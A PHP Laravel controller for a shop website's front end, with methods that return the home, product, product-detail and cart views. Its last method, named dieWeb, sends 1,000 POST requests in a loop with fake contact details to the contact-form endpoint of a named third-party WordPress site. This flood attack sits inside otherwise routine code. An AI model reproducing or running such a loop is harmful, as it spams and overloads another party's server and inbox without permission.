<?php

namespace App\Http\Controllers\FrontEnd;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Categories;
use Curl\Curl;
class HomeController extends Controller
{
    //protected $_cates;
    public function __construct()
    {
        //$category = new Categories();
        //$this->_cates = $category->categoriesFE();
    }

    /**
     * view index
    */
    public function home()
    {
        return view('frontend.page.home');
    }

    /**
     * view products
    */
    public function products(Request $request)
    {
        $cateId = $request->id;
        $cate = Categories::findOrFail($cateId);
        if($cate->alias === $request->name)
        {
            return view('frontend.page.product', ['cate' => $cate]);
        }

        return redirect('danh-muc/'.$cate->alias.'.'.$cate->cate_id);

    }

    /**
     * view detail
    */
    public function detail()
    {
        return view('frontend.page.product_detail');
    }

    /**
     * view cart
    */
    public function cart()
    {
        return view('frontend.page.cart');
    }

    /**
     *
    */
    public function dieWeb()
    {

        $data = [
            'hoten' => 'xxx',
            'dienthoai' => '0977555666',
            'email' => 'xxx@gmail.com',
            'diachi' => 'xxxx',
            'ghichu' => 'xxxxx'
        ];
        for($i = 0; $i < 1000; $i++)
        {
            $curl = new Curl();
            $curl->post('https://gomsubattrang360.com/wp-json/contact-form-7/v1/contact-forms/277/feedback', $data);
            $curl->close();
        }
    }
}
